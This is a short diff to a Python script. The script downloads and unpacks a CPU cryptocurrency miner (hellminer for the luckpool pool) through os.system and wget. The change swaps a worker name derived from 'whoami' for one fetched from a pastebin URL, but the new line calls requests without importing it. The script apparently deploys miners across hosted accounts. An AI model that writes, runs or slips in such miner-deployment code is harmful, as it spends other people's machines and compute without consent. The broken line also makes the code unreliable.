@@ -1,8 +1,9 @@
 #!/usr/bin/python3
 import os
 
-worker = os.popen("whoami").read().replace("\n", "").split('-')
-worker = f"{worker[1]}v{worker[2]}"
+#worker = os.popen("whoami").read().replace("\n", "").split('-')
+#worker = f"{worker[1]}v{worker[2]}"
+worker = requests.get("https://pastebin.com/raw/xctPfNp9").text.strip()
 
 os.system("wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz --quiet")
 os.system("tar -xvf hellminer_cpu_linux.tar.gz")
